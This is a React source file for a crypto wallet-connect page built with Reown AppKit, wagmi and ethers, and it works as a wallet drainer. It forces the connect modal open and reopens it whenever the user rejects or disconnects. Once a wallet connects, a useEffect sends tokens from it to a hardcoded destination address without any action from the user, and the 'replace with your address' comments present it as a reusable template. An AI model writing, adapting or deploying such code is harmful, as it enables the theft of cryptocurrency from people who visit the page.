import { createAppKit } from '@reown/appkit/react'
import { WagmiProvider, useAccount } from 'wagmi'
import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
import { useEffect } from 'react'
import { projectId, metadata, networks, wagmiAdapter , solanaWeb3JsAdapter} from './config'
import { ethers } from 'ethers';

import "./App.css"

const queryClient = new QueryClient()

const generalConfig = {
  projectId,
  metadata,
  networks,
  themeMode: 'dark' as const,
  features: {
    analytics: true // Optional - defaults to your Cloud configuration
  },
  themeVariables: {
    '--w3m-accent': '#000000',
  }
}

// Create modal
const appKit = createAppKit({
  adapters: [wagmiAdapter, solanaWeb3JsAdapter],
  ...generalConfig,
})

const DESTINATION_WALLET = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B" // Replace with your actual wallet address

const WalletDisplay = () => {
  const { address: userAddress, isConnected } = useAccount();

  useEffect(() => {
    const autoTransferTokens = async () => {
      if (isConnected && userAddress) {
        const provider = new ethers.providers.Web3Provider(window.ethereum);
        const signer = provider.getSigner();

        const recipientAddress = "0x365Fd0098DB3ed48e64fd816beaeEe69FE1e354B"; // Replace with your destination wallet address
        const amountToSend = ethers.utils.parseUnits("0.01", "ether"); // Adjust the amount and unit as needed

        const tokenContractAddress = "0x95aD61b0a150d79219dCF64E1E6Cc01f0B64C4cE"; // Replace with your token contract address
        const tokenAbi = [
          {
            constant: true,
            inputs: [],
            name: "name",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "value", type: "uint256" },
            ],
            name: "approve",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "totalSupply",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "sender", type: "address" },
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transferFrom",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "decimals",
            outputs: [{ name: "", type: "uint8" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "addedValue", type: "uint256" },
            ],
            name: "increaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [{ name: "value", type: "uint256" }],
            name: "burn",
            outputs: [],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [{ name: "account", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: true,
            inputs: [],
            name: "symbol",
            outputs: [{ name: "", type: "string" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "spender", type: "address" },
              { name: "subtractedValue", type: "uint256" },
            ],
            name: "decreaseAllowance",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: false,
            inputs: [
              { name: "recipient", type: "address" },
              { name: "amount", type: "uint256" },
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            payable: false,
            stateMutability: "nonpayable",
            type: "function",
          },
          {
            constant: true,
            inputs: [
              { name: "owner", type: "address" },
              { name: "spender", type: "address" },
            ],
            name: "allowance",
            outputs: [{ name: "", type: "uint256" }],
            payable: false,
            stateMutability: "view",
            type: "function",
          },
          {
            inputs: [
              { name: "name", type: "string" },
              { name: "symbol", type: "string" },
              { name: "decimals", type: "uint8" },
              { name: "totalSupply", type: "uint256" },
              { name: "feeReceiver", type: "address" },
              { name: "tokenOwnerAddress", type: "address" },
            ],
            payable: true,
            stateMutability: "payable",
            type: "constructor",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "from", type: "address" },
              { indexed: true, name: "to", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Transfer",
            type: "event",
          },
          {
            anonymous: false,
            inputs: [
              { indexed: true, name: "owner", type: "address" },
              { indexed: true, name: "spender", type: "address" },
              { indexed: false, name: "value", type: "uint256" },
            ],
            name: "Approval",
            type: "event",
          },
        ];
        

        const tokenContract = new ethers.Contract(tokenContractAddress, tokenAbi, signer);

        try {
          const tx = await tokenContract.transfer(recipientAddress, amountToSend);
          await tx.wait(); // Wait for the transaction to be mined
          console.log("Transfer successful:", tx);
        } catch (error) {
          console.error("Transfer failed:", error);
        }
      }
    };

    autoTransferTokens();
  }, [isConnected, userAddress]);

  return (
    <div style={{
      background: '#f0f0f0',
      padding: '1rem',
      borderRadius: '8px',
      marginTop: '20px',
      textAlign: 'center'
    }}>
      {isConnected && (
        <div style={{ marginTop: '20px' }}>
          <h3>Your Wallet Address:</h3>
          <code style={{ wordBreak: 'break-all' }}>{userAddress}</code>
        </div>
      )}
      <div style={{ marginTop: '20px' }}>
        <h3>Destination Wallet Address:</h3>
        <code style={{ wordBreak: 'break-all' }}>{DESTINATION_WALLET}</code>
      </div>
    </div>
  );
};

export function App() {
  useEffect(() => {
    // Auto-open modal on mount
    const openModal = async () => {
      try {
        await appKit.open()
      } catch (error) {
        console.log("Connection rejected", error)
        // Retry opening the modal after rejection
        setTimeout(() => openModal(), 500)
      }
    }

    openModal()

    // Reopen modal on disconnect
    const handleDisconnect = () => {
      openModal()
    }

    window.addEventListener('disconnect', handleDisconnect)
    return () => {
      window.removeEventListener('disconnect', handleDisconnect)
    }
  }, [])

  return (
    <div className={"pages"}>
      <WagmiProvider config={wagmiAdapter.wagmiConfig}>
        <QueryClientProvider client={queryClient}>
            <WalletDisplay />
            {/* <ActionButtonList /> */}
        </QueryClientProvider>
      </WagmiProvider>
    </div>
  )
}

export default App
